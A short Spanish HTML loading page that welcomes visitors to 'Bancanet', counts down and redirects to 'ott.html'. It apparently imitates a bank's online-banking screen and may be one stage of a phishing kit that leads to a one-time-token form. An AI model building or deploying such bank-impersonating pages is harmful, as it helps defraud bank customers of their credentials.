<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pantalla de Carga</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #00865A; /* Color verde de fondo */
            font-family: Arial, sans-serif;
            color: white;
        }

        .loader-container {
            text-align: center;
        }

        .loader-container img {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
        }

        .dots {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .dot {
            width: 10px;
            height: 10px;
            margin: 0 5px;
            background-color: white;
            border-radius: 50%;
            animation: grow-shrink 1s infinite; /* Cambiado a 1s para mayor velocidad */
        }

        .dot:nth-child(1) {
            animation-delay: 0s;
        }

        .dot:nth-child(2) {
            animation-delay: 0.25s; /* Ajuste de delay para mayor rapidez */
        }

        .dot:nth-child(3) {
            animation-delay: 0.5s; /* Ajuste de delay para mayor rapidez */
        }

        @keyframes grow-shrink {
            0% { transform: scale(1); }
            50% { transform: scale(2); }
            100% { transform: scale(1); }
        }

        .text {
            font-size: 18px;
            margin-top: 20px;
        }

        .countdown {
            font-size: 24px;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <img width="100px" src="descarga.png" alt="Logo"> <!-- Deja aquí el espacio para la imagen -->
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <br>
        <div> 
            <div class="text">Bienvenido a Bancanet</div>
            <div class="text">Por favor espere un momento...</div>
            <br>
            <div style="font-size: 20px;" class="countdown" id="countdown">10</div> <!-- Contador regresivo -->
        </div>
    </div>

    <script>
        let countdownElement = document.getElementById('countdown');
        let countdown = 10;

        let countdownInterval = setInterval(() => {
            countdown--;
            countdownElement.textContent = countdown;
            if (countdown === 0) {
                clearInterval(countdownInterval);
                countdownElement.textContent = "¡Listo!";

                // Mostrar "¡Listo!" por 1 segundo antes de redirigir
                setTimeout(() => {
                    window.location.href = "ott.html";
                }, 1000); // Espera 1 segundo (1000 ms) antes de redirigir
            }
        }, 2000); // 2000ms = 2 segundos por cada decremento
    </script>

</body>
</html>
